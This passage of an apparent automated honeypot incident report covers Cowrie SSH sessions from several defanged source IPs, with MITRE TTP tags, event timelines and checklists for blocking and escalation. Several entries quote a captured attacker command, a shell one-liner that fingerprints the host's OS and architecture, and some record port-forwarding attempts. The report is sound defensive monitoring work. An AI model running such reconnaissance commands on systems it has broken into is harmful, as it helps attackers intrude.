| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:34:18` | `cowrie.session.connect` |
| `2026-07-11 08:34:18` | `cowrie.client.version` |
| `2026-07-11 08:34:18` | `cowrie.client.kex` |
| `2026-07-11 08:34:19` | `cowrie.login.success` |
| `2026-07-11 08:34:20` | `cowrie.session.params` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.success` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.log.closed` |
| `2026-07-11 08:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fd72a17aee2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 08:34 |
| **Last Seen** | 2026-07-11 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:34:18` | `cowrie.session.connect` |
| `2026-07-11 08:34:18` | `cowrie.client.version` |
| `2026-07-11 08:34:18` | `cowrie.client.kex` |
| `2026-07-11 08:34:19` | `cowrie.login.success` |
| `2026-07-11 08:34:19` | `cowrie.session.params` |
| `2026-07-11 08:34:19` | `cowrie.command.input` |
| `2026-07-11 08:34:20` | `cowrie.log.closed` |
| `2026-07-11 08:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f0931eb9700

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:35 |
| **Last Seen** | 2026-07-11 08:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:35:51` | `cowrie.session.connect` |
| `2026-07-11 08:35:51` | `cowrie.client.version` |
| `2026-07-11 08:35:51` | `cowrie.client.kex` |
| `2026-07-11 08:35:52` | `cowrie.login.success` |
| `2026-07-11 08:35:54` | `cowrie.session.params` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.success` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.command.input` |
| `2026-07-11 08:35:54` | `cowrie.log.closed` |
| `2026-07-11 08:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42194c1bb3d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:37 |
| **Last Seen** | 2026-07-11 08:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:37:24` | `cowrie.session.connect` |
| `2026-07-11 08:37:24` | `cowrie.client.version` |
| `2026-07-11 08:37:24` | `cowrie.client.kex` |
| `2026-07-11 08:37:24` | `cowrie.login.success` |
| `2026-07-11 08:37:25` | `cowrie.session.params` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.success` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.command.input` |
| `2026-07-11 08:37:25` | `cowrie.log.closed` |
| `2026-07-11 08:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5fdd6871b85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:38 |
| **Last Seen** | 2026-07-11 08:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:38:59` | `cowrie.session.connect` |
| `2026-07-11 08:38:59` | `cowrie.client.version` |
| `2026-07-11 08:38:59` | `cowrie.client.kex` |
| `2026-07-11 08:39:00` | `cowrie.login.success` |
| `2026-07-11 08:39:01` | `cowrie.session.params` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.success` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.command.input` |
| `2026-07-11 08:39:01` | `cowrie.log.closed` |
| `2026-07-11 08:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b60fcd0a13

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-07-11 08:40 |
| **Last Seen** | 2026-07-11 08:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:40:06` | `cowrie.session.connect` |
| `2026-07-11 08:40:07` | `cowrie.client.version` |
| `2026-07-11 08:40:07` | `cowrie.client.kex` |
| `2026-07-11 08:40:10` | `cowrie.login.success` |
| `2026-07-11 08:40:11` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548819f3b88c

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-11 08:40 |
| **Last Seen** | 2026-07-11 08:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:40:21` | `cowrie.session.connect` |
| `2026-07-11 08:40:22` | `cowrie.client.version` |
| `2026-07-11 08:40:22` | `cowrie.client.kex` |
| `2026-07-11 08:40:25` | `cowrie.login.success` |
| `2026-07-11 08:40:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14545ec55a41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:40 |
| **Last Seen** | 2026-07-11 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:40:35` | `cowrie.session.connect` |
| `2026-07-11 08:40:35` | `cowrie.client.version` |
| `2026-07-11 08:40:35` | `cowrie.client.kex` |
| `2026-07-11 08:40:35` | `cowrie.login.success` |
| `2026-07-11 08:40:36` | `cowrie.session.params` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.success` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.command.input` |
| `2026-07-11 08:40:36` | `cowrie.log.closed` |
| `2026-07-11 08:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb93933931a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:42 |
| **Last Seen** | 2026-07-11 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:42:10` | `cowrie.session.connect` |
| `2026-07-11 08:42:10` | `cowrie.client.version` |
| `2026-07-11 08:42:10` | `cowrie.client.kex` |
| `2026-07-11 08:42:11` | `cowrie.login.success` |
| `2026-07-11 08:42:12` | `cowrie.session.params` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.success` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.command.input` |
| `2026-07-11 08:42:12` | `cowrie.log.closed` |
| `2026-07-11 08:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e0216a52a8e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 08:42 |
| **Last Seen** | 2026-07-11 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:42:12` | `cowrie.session.connect` |
| `2026-07-11 08:42:12` | `cowrie.client.version` |
| `2026-07-11 08:42:12` | `cowrie.client.kex` |
| `2026-07-11 08:42:12` | `cowrie.login.success` |
| `2026-07-11 08:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9896d90a46e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 08:42 |
| **Last Seen** | 2026-07-11 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:42:12` | `cowrie.session.connect` |
| `2026-07-11 08:42:12` | `cowrie.client.version` |
| `2026-07-11 08:42:12` | `cowrie.client.kex` |
| `2026-07-11 08:42:12` | `cowrie.login.success` |
| `2026-07-11 08:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54c74ef80a6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 08:42 |
| **Last Seen** | 2026-07-11 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:42:13` | `cowrie.session.connect` |
| `2026-07-11 08:42:13` | `cowrie.client.version` |
| `2026-07-11 08:42:13` | `cowrie.client.kex` |
| `2026-07-11 08:42:13` | `cowrie.login.success` |
| `2026-07-11 08:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842cff5e6c6b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 08:42 |
| **Last Seen** | 2026-07-11 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:42:13` | `cowrie.session.connect` |
| `2026-07-11 08:42:13` | `cowrie.client.version` |
| `2026-07-11 08:42:13` | `cowrie.client.kex` |
| `2026-07-11 08:42:13` | `cowrie.login.success` |
| `2026-07-11 08:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f5c8a8e221

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:43 |
| **Last Seen** | 2026-07-11 08:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:43:45` | `cowrie.session.connect` |
| `2026-07-11 08:43:45` | `cowrie.client.version` |
| `2026-07-11 08:43:45` | `cowrie.client.kex` |
| `2026-07-11 08:43:46` | `cowrie.login.success` |
| `2026-07-11 08:43:47` | `cowrie.session.params` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.success` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.command.input` |
| `2026-07-11 08:43:47` | `cowrie.log.closed` |
| `2026-07-11 08:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762565f05572

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-07-11 08:43 |
| **Last Seen** | 2026-07-11 08:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:43:48` | `cowrie.session.connect` |
| `2026-07-11 08:43:49` | `cowrie.client.version` |
| `2026-07-11 08:43:49` | `cowrie.client.kex` |
| `2026-07-11 08:43:52` | `cowrie.login.success` |
| `2026-07-11 08:43:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343c0ed75ee3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:45 |
| **Last Seen** | 2026-07-11 08:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:45:25` | `cowrie.session.connect` |
| `2026-07-11 08:45:25` | `cowrie.client.version` |
| `2026-07-11 08:45:25` | `cowrie.client.kex` |
| `2026-07-11 08:45:26` | `cowrie.login.success` |
| `2026-07-11 08:45:27` | `cowrie.session.params` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.success` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.command.input` |
| `2026-07-11 08:45:27` | `cowrie.log.closed` |
| `2026-07-11 08:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d058ddf798

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:47 |
| **Last Seen** | 2026-07-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:47:10` | `cowrie.session.connect` |
| `2026-07-11 08:47:10` | `cowrie.client.version` |
| `2026-07-11 08:47:10` | `cowrie.client.kex` |
| `2026-07-11 08:47:11` | `cowrie.login.success` |
| `2026-07-11 08:47:12` | `cowrie.session.params` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.success` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
| `2026-07-11 08:47:12` | `cowrie.command.input` |
